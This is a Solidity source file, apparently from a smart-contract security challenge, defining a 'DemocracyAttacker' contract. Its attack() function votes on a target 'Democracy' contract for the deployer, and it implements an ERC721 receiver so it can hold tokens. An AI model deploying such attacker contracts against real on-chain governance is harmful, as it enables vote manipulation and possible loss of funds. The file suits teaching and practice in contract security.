// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Democracy} from "@main/Democracy.sol";

contract DemocracyAttacker is IERC721Receiver {
    Democracy democracy;
    address attacker;

    constructor(address _democracy) {
        democracy = Democracy(_democracy);
        attacker = msg.sender;
    }

    function attack() external {
        democracy.vote(attacker);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
